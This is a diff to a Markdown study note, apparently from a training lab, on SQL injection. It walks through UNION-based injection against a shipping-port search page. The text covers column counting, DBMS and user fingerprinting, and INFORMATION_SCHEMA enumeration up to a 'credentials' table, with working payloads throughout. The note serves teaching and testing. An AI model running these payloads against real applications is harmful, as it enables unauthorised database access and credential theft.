@@ -18,9 +18,9 @@ This document summarizes core techniques for discovery and exploitation of **SQL
     - [UNION Injection](#union-injection)
     - [Exploitation Example - Walkthrough](#exploitation-example---walkthrough)
         - [Discovery](#discovery)
-        - [Number of Columns](#number-of-columns)
         - [Fingerprinting](#fingerprinting)
         - [Database Enumeration](#database-enumeration)
+        - [Crafting a Payload](#crafting-a-payload)
 
 ---
 
@@ -677,7 +677,7 @@ SELECT * FROM employees UNION SELECT dept_no, dept_name, NULL, NULL, NULL, NULL 
 
 ### Discovery
 
-An attacker is targeting an application used to track shipping ports. He discovers a visible GET parameter.
+An attacker is targeting an application used to track shipping ports. The attacker discovers a visible GET parameter.
 
 ```
 http://94.237.54.192:55159/search.php?port_code=cn
@@ -685,13 +685,13 @@ http://94.237.54.192:55159/search.php?port_code=cn
 
 ![Filtered output](images/shipping-port.png)
 
-Based on the URL he assumes that the back-end SQL query looks something like this:
+Based on the URL the attacker assumes that the back-end SQL query looks something like this:
 
 ```sql
 SELECT * FROM ports WHERE port_code = 'cn';
 ```
 
-He initiates the SQL injection discovery process by injecting a single quote `'` and observes the applications behavior. 
+The attacker initiates the SQL injection discovery process by injecting a single quote `'` and observes the application's behavior. 
 
 ```
 http://94.237.54.192:55159/search.php?port_code='
@@ -699,7 +699,7 @@ http://94.237.54.192:55159/search.php?port_code='
 
 ![Filtered output](images/union-injection2.png)
 
-The single quote `'` injection caused a SQL syntax error. This means that the attacker was able to input something that changed the SQL query being sent to the back-end database. This increases the probability of a SQL injection vulnerability being present. 
+The single quote `'` injection caused a SQL syntax error. This means that the attacker was able to input something that changed the SQL query being sent to the back-end database. This strongly suggests that user input is being directly incorporated into the SQL query without proper handling. 
 
 The single quote `'` injection probably changed the SQL query to look something like this:
 
@@ -707,20 +707,20 @@ The single quote `'` injection probably changed the SQL query to look something 
 SELECT * FROM ports WHERE port_code = ''';
 ```
 
-The third single quote does not have a corresponding ending quote, resulting in the syntax error. 
+The injected quote breaks the string literal, resulting in an unbalanced quotation and a SQL syntax error.
 
 ---
 
-### Number of Columns
+### Fingerprinting
 
-Before exploiting the application the attacker must determine how many columns the table has. He can accomplish this in two ways:
+Before exploiting the application, the attacker must determine how many columns the table has. This can be accomplished in two ways:
 
 - By using `ORDER BY`
-- By using a `UNION CLAUSE`
+- By using a `UNION`
 
 **Method 1: `ORDER BY`**
 
-He repeatedly injects integers representing the column to sort by, and increments the integer by one, for every iteration. This continues until he gets an error message, stating that the column specified does not exist.  
+The attacker repeatedly injects integers representing the column to sort by, and increments the integer by one for each iteration. This continues until an error is induced, stating that the specified column index is out of range.
 
 ```sql
 ' ORDER BY 1-- 
@@ -734,13 +734,13 @@ He repeatedly injects integers representing the column to sort by, and increment
 http://94.237.54.192:55159/search.php?port_code=%27+ORDER+BY+5--+
 ```
 
-He gets an error on the fifth column, meaning that the table has four columns.
+An error is induced on the fifth column, meaning that the table has four columns.
 
 ![Filtered output](images/order-by.png)
 
 **Method 2: `UNION`**
 
-The attacker performs repeated `UNION` injections with a different number of columns each time, starting at 1 and incrementing by one for each iteration. This continues until he gets a successful response. 
+The attacker performs repeated `UNION` injections with a different number of columns each time, starting at 1 and incrementing by 1 for each iteration. This continues until a successful response is induced. 
 
 ```sql
 ' UNION SELECT 1--  
@@ -753,13 +753,13 @@ The attacker performs repeated `UNION` injections with a different number of col
 http://94.237.54.192:55159/search.php?port_code=%27+UNION+SELECT+1%2C2%2C3%2C4--+
 ```
 
-The fourth column returns a successful response, meaning that the table has four columns.
+A successful response indicates that the injected `UNION SELECT` matches the column count of the original query.
 
 ![Filtered output](images/union-select.png)
 
 Even though the table has four columns, all columns are not necessarily shown in the output. The attacker must figure out which columns are shown in order to determine where to inject payloads. 
 
-The attacker performs a `UNION` injection, by specifying four columns, and observes the output returned by the query.
+A `UNION` injection is then performed by specifying four columns.
 
 ```sql
 cn' UNION SELECT 1,2,3,4--  
@@ -769,24 +769,20 @@ cn' UNION SELECT 1,2,3,4--
 http://94.237.54.192:55159/search.php?port_code=cn%27+UNION+SELECT+1%2C2%2C3%2C4--+
 ```
 
-Only columns 2, 3 and 4 are displayed in the output. This means that the attacker must place the payload in one of these columns.
+Only columns 2, 3 and 4 are displayed in the output. This means that the payload must be injected into one of these columns.
 
 ![Filtered output](images/injection-point.png)
 
 The example above demonstrates a scenario where it is beneficial to use `INT` as junk data, instead of `NULL`. Using `INT` makes it easy to track exactly which columns are being displayed. 
 
----
-
-### Fingerprinting
-
-To develop a suitable payload, the attacker needs information about the DBMS version and the current user.
+Information about the DBMS version and the current user is also needed to devlop a suitable payload.
 
 It is possible to make a rough guess regarding the DBMS:
 
-- If the server is **Apache** or **Nginx** and running on **Linux**, the DBMS is likely **MySQL**.
-- If the server is **IIS** running on **Windows**, the DBMS is likely **MSSQL**.
+- If the server is **Apache** or **Nginx** and running on **Linux**, the DBMS is often **MySQL**.
+- If the server is **IIS** running on **Windows**, the DBMS is often **MSSQL**.
 
-To be sure regarding the DBMS and version, the attacker injects a `@@version` payload into the second column.
+To be confirm the DBMS and version, the attacker injects a `@@version` payload into the second column.
 
 ```sql
 cn' UNION SELECT 1, @@version, 3, 4--   
@@ -796,7 +792,7 @@ cn' UNION SELECT 1, @@version, 3, 4--
 
 The exact DBMS and version is `10.3.22-MariaDB-1ubuntu1`.
 
-He proceeds by fingerprinting the current user by injecting the `user()` payload into the second column.
+The attacker proceeds by fingerprinting the current user by injecting the `user()` payload into the second column.
 
 ```sql
 cn' UNION SELECT 1, user(), 3, 4--   
@@ -804,14 +800,60 @@ cn' UNION SELECT 1, user(), 3, 4--
 
 ![Filtered output](images/fingerprint-user.png)
 
-The current user is `root`.
+The current user is `root`. Running the database as `root` significantly increases the impact of a successful SQL injection.
 
 ---
 
 ### Database Enumeration
 
-To craft payloads capable of pulling data across the DBMS, the attacker needs information about:
+To craft payloads capable of pulling data across a DBMS, information about the following is necessary:
 
 - Databases
 - Tables
 - Columns
+
+`INFORMATION_SCHEMA` is a metadata database implemented by many DBMSs, including MySQL and MariaDB. It contains information about databases, tables, columns, and other objects on the system.
+
+`SCHEMATA` is a table in `INFORMATION_SCHEMA`. The `SCHEMA_NAME` column in `SCHEMATA` is a list of all databases on the DBMS.
+
+The attacker utilizes this information to retrieve a list of all databases:
+
+```sql
+cn' UNION SELECT 1, SCHEMA_NAME, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA--   
+```
+
+![Filtered output](images/enumerate-dbs.png)
+
+`TABLES` is also a table in `INFORMATION_SCHEMA`. The `TABLE_NAME` column in `TABLES` is a list of all tables on the DBMS.
+
+The attacker performs a similar injection to before, in order to retrieve a list of all tables and the associated databases:
+
+```sql
+cn' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES--   
+```
+
+![Filtered output](images/enumerate-tables.png)
+
+To craft a more precise query, the exact database to pull tables from can be specified. For example, the `dev` database:
+
+```sql
+cn' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dev'--    
+```
+
+![Filtered output](images/enumerate-tables2.png)
+
+`COLUMNS` is another table in `INFORMATION_SCHEMA`. The `COLUMN_NAME` column in `COLUMNS` contains the names of all columns across all tables.
+
+The attacker proceeds by enumerating all columns and associated tables:
+
+```sql
+cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS--   
+```
+
+As in the previous example, the query can be refined to only pull columns from a certain table. For example, the `credentials` table:
+
+```sql
+cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='credentials'--    
+```
+
+### Crafting a Payload
